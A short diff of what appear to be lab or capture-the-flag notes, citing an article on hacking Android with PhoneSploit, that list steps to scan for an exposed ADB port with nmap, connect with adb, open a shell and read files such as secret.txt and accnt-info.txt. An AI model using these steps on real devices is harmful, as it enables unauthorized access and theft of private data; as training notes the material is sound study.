@@ -16,7 +16,8 @@ https://n00bie.medium.com/hacking-android-using-phonesploit-ffbb2a899e6
 	ls
 	cd downloads
 	cat accnt-info.txt
-----------------------------------------------------------------------------------------------------------------1- nmap ip -sV -p 5555    (Scan for adb port)
+----------------------------------------------------------------------------------------------------------------
+1- nmap ip -sV -p 5555    (Scan for adb port)
 2- adb connect IP:5555    (Connect adb with parrot)
 3- adb shell              (Access mobile device on parrot)
 4- pwd --> ls --> cd sdcard --> ls --> cat secret.txt (If you can't find it there then go to Downloads folder using: cd downloads)
